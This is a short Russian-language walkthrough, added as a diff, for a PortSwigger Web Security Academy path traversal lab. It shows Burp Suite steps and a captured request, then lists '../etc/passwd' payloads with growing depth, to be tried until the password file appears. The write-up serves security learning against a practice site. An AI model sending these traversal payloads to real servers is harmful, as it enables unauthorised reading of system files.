@@ -1,0 +1,33 @@
+https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/lab-simple#
+
+1. Start BurpSuite
+2. proxy наш сайт
+3. делаем переходы по сайту
+4. HTTP history отобразат историю переходов. Добавляем в фильтр (configure filter) image
+5. URL = /image?filename=72.jpg  есть файлы. 
+6. Send to Repeater 
+
+GET /image?filename=/image?filename=72.jpg HTTP/2
+Host: 0a8600e3039bdf69824c157800f500df.web-security-academy.net
+Cookie: session=y1hf0wsrfGUOgTICHGxEVGAcY23WyE7g
+Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a8600e3039bdf69824c157800f500df.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: i
+
+Меняем :
+GET /image?filename=/image?filename=72.jpg HTTP/2
+На:
+GET /image?filename=../etc/passwd HTTP/2
+GET /image?filename=../../etc/passwd HTTP/2
+GET /image?filename=../../../etc/passwd HTTP/2
+Пока не получим результат в виде вывода файла etc/passwd
+
